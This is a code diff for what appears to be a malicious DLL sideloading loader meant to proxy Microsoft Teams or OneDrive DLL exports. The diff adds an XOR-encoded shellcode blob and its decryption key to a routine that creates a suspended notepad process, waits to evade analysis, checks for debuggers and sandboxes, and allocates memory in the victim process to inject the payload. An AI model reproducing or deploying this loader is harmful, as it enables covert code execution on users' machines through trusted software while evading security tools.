+++ Visualstudio_Files/main.c
@@ -12,6 +12,7 @@
 //We must use sharpdllproxy to auto make us a C file which will include all this exports.
 //In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls
 
+//here DLL exports are specified based an the user choice either MS Teams || OneDrive
 
 
 #pragma comment(linker, "/export:=tmpB0F7.,@104")
@@ -131,6 +132,8 @@
 #pragma comment(linker, "/export:=tmpB0F7.,@218")
 #pragma comment(linker, "/export:=tmpB0F7.,@219")
 
+
+
 BOOL executed = FALSE;
 
 //xor decryption
@@ -207,8 +210,22 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
 {
 
     unsigned char encoded_kwdikas[] = {
-  
-    };
+	0x30, 0x3f, 0xf1, 0xc1, 0x3c, 0x9f, 0xbe, 0x25, 0xcc, 0x77, 0x33, 0x74, 0x8d, 0x27, 0x20, 0x74, 0x84, 0x46, 0xa0, 0x73, 0xa9, 0x3f, 0xf9, 0x77, 0xac, 0x3f, 0xf9, 0x77, 0xd4, 0x3f, 0xf9, 0x77, 0xec, 0x3a, 0x43, 0xec, 0x84, 0x78, 0xc5, 0x6f, 0x86, 0x3f, 0xf9, 0x57, 0x9c, 0x3f, 0x43, 0xe5, 0x60, 0x4b,
+	0x13, 0x59, 0xce, 0x5b, 0x52, 0x64, 0x0d, 0xbe, 0x7f, 0x64, 0xcd, 0xb6, 0x90, 0xc8, 0x9e, 0x3f, 0xf9, 0x77, 0xec, 0xfc, 0x30, 0x19, 0x8d, 0x26, 0x3a, 0x24, 0x1c, 0x11, 0xf3, 0x5d, 0xd4, 0x7c, 0x70, 0x2a, 0x49, 0x05, 0x72, 0x25, 0xcc, 0xfc, 0xf2, 0xad, 0xcc, 0x77, 0x72, 0x6d, 0x49, 0xb7, 0x06, 0x42,
+	0x84, 0x76, 0xa2, 0xae, 0x84, 0x6f, 0x36, 0xae, 0x8c, 0x57, 0x22, 0x6c, 0xcd, 0xa7, 0x91, 0x73, 0x81, 0x46, 0xbb, 0x6d, 0x33, 0xbe, 0x33, 0xae, 0xf8, 0xff, 0x3a, 0x24, 0x1a, 0x3f, 0x43, 0xe5, 0x60, 0x36, 0xb3, 0xec, 0xc1, 0x36, 0x73, 0xe4, 0xf4, 0x97, 0x07, 0xd4, 0x80, 0x74, 0x3e, 0x01, 0xc4, 0x32,
+	0x4b, 0xf4, 0xb9, 0xaf, 0x2a, 0x61, 0x47, 0x37, 0x56, 0x6c, 0xcd, 0xa7, 0x14, 0x64, 0x47, 0x7b, 0x3a, 0x61, 0x47, 0x37, 0x6e, 0x6c, 0xcd, 0xa7, 0x33, 0xae, 0xc8, 0xff, 0x3a, 0x24, 0x1c, 0x36, 0x2a, 0x64, 0x94, 0x29, 0x2b, 0x7f, 0x8d, 0x2f, 0x33, 0x7c, 0x8d, 0x2d, 0x3a, 0xa6, 0x20, 0x57, 0x33, 0x77,
+	0x33, 0x97, 0x2a, 0x64, 0x95, 0x2d, 0x3a, 0xae, 0xde, 0x9e, 0x39, 0xda, 0x33, 0x88, 0x2f, 0x6d, 0xfd, 0xac, 0x21, 0x6c, 0x72, 0x00, 0x1b, 0x4b, 0xa5, 0x19, 0x17, 0x51, 0xcc, 0x36, 0x24, 0x6d, 0x45, 0x96, 0x3b, 0xe2, 0x0e, 0x3b, 0x05, 0x03, 0xcb, 0x88, 0xa7, 0x76, 0x9f, 0x3f, 0xfb, 0xc4, 0x9f, 0x2d,
+	0x3f, 0x14, 0x0c, 0x3a, 0x43, 0xec, 0x9f, 0x24, 0x3b, 0x9f, 0xf6, 0x21, 0x0b, 0x82, 0xcc, 0x77, 0x72, 0x25, 0x33, 0xa2, 0x9a, 0x35, 0xcc, 0x77, 0x72, 0x14, 0xf5, 0x45, 0x5c, 0x14, 0xfa, 0x4f, 0x5c, 0x14, 0xf9, 0x45, 0x5c, 0x14, 0xfe, 0x4e, 0x72, 0x7f, 0x84, 0xfe, 0xb3, 0x6c, 0x0b, 0xb7, 0xc9, 0x24,
+	0xcc, 0x77, 0x3f, 0x14, 0x05, 0x24, 0x21, 0x4f, 0xcf, 0x24, 0x3b, 0x9f, 0x9b, 0xfe, 0xed, 0xe3, 0xcc, 0x77, 0x72, 0x25, 0x33, 0xa2, 0x9a, 0x82, 0xcc, 0x77, 0x72, 0x0a, 0xad, 0x18, 0x10, 0x41, 0xbe, 0x21, 0x40, 0x12, 0xa5, 0x0f, 0x02, 0x6e, 0x83, 0x47, 0x01, 0x10, 0x80, 0x19, 0x40, 0x42, 0x8a, 0x00,
+	0x1c, 0x1c, 0xfe, 0x11, 0x22, 0x70, 0xa7, 0x1d, 0x30, 0x47, 0xa2, 0x3e, 0x30, 0x4a, 0x8d, 0x32, 0x19, 0x5d, 0xa8, 0x03, 0x41, 0x17, 0xe1, 0x1c, 0x43, 0x11, 0x80, 0x22, 0x23, 0x50, 0x87, 0x04, 0x1b, 0x55, 0xf9, 0x0e, 0x08, 0x4f, 0xa1, 0x2f, 0x05, 0x77, 0x83, 0x22, 0x39, 0x57, 0xb5, 0x14, 0x2d, 0x6b,
+	0x87, 0x1e, 0x41, 0x60, 0xa6, 0x45, 0x42, 0x1d, 0x9d, 0x31, 0x2d, 0x70, 0xfd, 0x0e, 0x28, 0x55, 0xbd, 0x12, 0x1d, 0x4a, 0x93, 0x19, 0x01, 0x15, 0xaa, 0x04, 0x24, 0x4a, 0xb8, 0x1e, 0x3e, 0x41, 0xa3, 0x1a, 0x0a, 0x51, 0x95, 0x31, 0x43, 0x6e, 0xbb, 0x42, 0x03, 0x51, 0x99, 0x2d, 0x33, 0x61, 0x8e, 0x0d,
+	0x20, 0x15, 0xf8, 0x27, 0x1b, 0x55, 0xfc, 0x22, 0x03, 0x5c, 0x83, 0x16, 0x22, 0x6f, 0xbd, 0x41, 0x2d, 0x69, 0xbe, 0x27, 0x3f, 0x66, 0xbf, 0x3d, 0x14, 0x50, 0xaa, 0x0f, 0x3c, 0x69, 0xa2, 0x31, 0x25, 0x4b, 0xa8, 0x15, 0x22, 0x13, 0x82, 0x3d, 0x1c, 0x62, 0x9e, 0x77, 0x3a, 0xac, 0x0d, 0x24, 0x28, 0x64,
+	0x94, 0x3a, 0x43, 0xec, 0x9f, 0x3f, 0xca, 0x25, 0xfe, 0xdf, 0xf6, 0x25, 0xcc, 0x77, 0x72, 0x75, 0x9f, 0x24, 0x3b, 0xe2, 0x0e, 0x9c, 0x27, 0x0b, 0xf7, 0x88, 0xa7, 0x6d, 0x45, 0xb1, 0x18, 0x2f, 0x93, 0x3f, 0xfb, 0xd4, 0xa6, 0x68, 0x28, 0x77, 0xa4, 0xf7, 0x41, 0x25, 0xcc, 0x3e, 0xfb, 0xc5, 0xa6, 0x73,
+	0x33, 0x7c, 0x85, 0xcd, 0x07, 0x63, 0x52, 0xf1, 0x72, 0x25, 0xcc, 0x77, 0x8d, 0xf0, 0x81, 0x46, 0xb2, 0x76, 0x96, 0x3f, 0xfb, 0xd4, 0x81, 0x46, 0xbb, 0x68, 0xfd, 0xbe, 0x21, 0x76, 0x85, 0xb0, 0xb0, 0x08, 0xca, 0x6f, 0x09, 0xda, 0x19, 0xf2, 0xb2, 0x50, 0xd3, 0x3f, 0xb5, 0xe4, 0x44, 0x64, 0x72, 0x25,
+	0x85, 0xcd, 0x36, 0xd5, 0xf9, 0x97, 0x72, 0x25, 0xcc, 0x77, 0x8d, 0xf0, 0x84, 0x88, 0xbd, 0x51, 0xce, 0x9c, 0xd8, 0xcd, 0x99, 0x77, 0x72, 0x25, 0x9f, 0x2e, 0x18, 0x65, 0x96, 0x3e, 0xfb, 0xf4, 0x0d, 0x95, 0x62, 0x6c, 0x0b, 0xb7, 0x72, 0x35, 0xcc, 0x77, 0x3b, 0x9f, 0x94, 0xd3, 0x21, 0xc0, 0xcc, 0x77,
+	0x72, 0x25, 0x33, 0xa2, 0x3a, 0xb6, 0x9f, 0x24, 0x3a, 0xac, 0x2b, 0x3f, 0xfb, 0xd4, 0x84, 0xfe, 0xa8, 0x6c, 0x0b, 0xb7, 0x72, 0x05, 0xcc, 0x77, 0x3b, 0xac, 0x35, 0x3e, 0xc8, 0x37, 0x5a, 0xfe, 0x90, 0x25, 0xcc, 0x77, 0x72, 0xda, 0x19, 0x3f, 0xf1, 0xe1, 0xec, 0xf2, 0xb2, 0x51, 0x7e, 0x11, 0xf9, 0x22,
+	0x84, 0x76, 0xb1, 0xa0, 0x0c, 0x02, 0xa0, 0x7d, 0x0f, 0x2f, 0x18, 0x25, 0x95, 0x3e, 0xb5, 0xe7, 0x3c, 0xc2, 0xd0, 0x73, 0x33, 0xa2
+};
 
     if (!executed)
     {
@@ -221,37 +238,37 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
 
         allocation_start = nullptr;
 
-        char key[] = "";
+        char key[] = "\xcc\x77\x72\x25";
 
         STARTUPINFOA si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
 
-        CreateProcessA("C:\\Windows\\system32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+        CreateProcessA("C:\\Windows\\system32\\notepad.exe.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
         HANDLE victimProcess = pi.hProcess;
         HANDLE threadHandle = pi.hThread;
         //delay execution
         timing_CreateWaitableTimer(4000);
 
-        /*++
+                    /*++
 
-Routine Description:
+            Routine Description:
 
-    CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
-    it can be used to check if a remote process is being debugged. However,
-    we can also use this as another method for checking if our own process
-    is being debugged. This API internally calls the NTDLL export
-    NtQueryInformationProcess function with the PROCESSINFOCLASS set to
-    7 (ProcessDebugPort).
+                CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
+                it can be used to check if a remote process is being debugged. However,
+                we can also use this as another method for checking if our own process
+                is being debugged. This API internally calls the NTDLL export
+                NtQueryInformationProcess function with the PROCESSINFOCLASS set to
+                7 (ProcessDebugPort).
 
-Arguments:
-    None
-Return Value:
+            Arguments:
+                None
+            Return Value:
 
-    TRUE - if debugger was detected
-    FALSE - otherwise
---*/
+                TRUE - if debugger was detected
+                FALSE - otherwise
+            --*/
         BOOL bIsDbgPresent = FALSE;
-        DWORD oldProtect = NULL;
+        DWORD oldProtect= NULL;
         CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
         // Allocate Virtual Memory 
         NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -271,7 +288,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     LPVOID lpReserved
 )
 {
-    LPVOID allocation_start;
+  LPVOID allocation_start;
     HANDLE hThread;
     allocation_start = nullptr;
     //HANDLE threadHandle;
@@ -282,10 +299,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         //sandbox check for harddisk size
         gensandbox_drive_size();
 
-
+    
         hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
         CloseHandle(hThread);
-
+        
 
 
     case DLL_THREAD_ATTACH:
